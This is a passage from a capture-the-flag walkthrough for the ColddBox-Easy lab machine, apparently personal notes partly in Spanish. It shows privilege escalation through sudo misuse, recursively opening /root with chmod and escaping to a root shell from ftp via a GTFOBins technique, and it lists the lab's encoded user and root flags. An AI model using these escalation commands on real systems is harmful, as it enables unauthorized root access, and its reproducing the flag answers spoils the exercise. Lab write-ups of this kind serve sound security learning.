En resumen, el comando "sudo chmod -R 755 /root" se utiliza para establecer permisos de lectura, escritura y ejecución para el propietario del directorio /root y permisos de lectura y ejecución para el grupo y otros para todos los archivos y subdirectorios en /root de manera recursiva.

c0ldd@ColddBox-Easy:/var/www/html$ sudo chmod -R 755 /root; cat /root/root.txt
sudo chmod -R 755 /root; cat /root/root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=

https://gtfobins.github.io/gtfobins/ftp/

c0ldd@ColddBox-Easy:/var/www/html$ sudo ftp
sudo ftp
ftp> !/bin/sh
!/bin/sh
# whoami
whoami
root

:)

```

![[Pasted image 20221226113605.png]]

![[Pasted image 20221226121553.png]]
![[Pasted image 20221226123208.png]]



user.txt

Provide the flag in its encoded format

*RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==*


root.txt

Provide the flag in its encoded format

*wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=*


[[All in One]]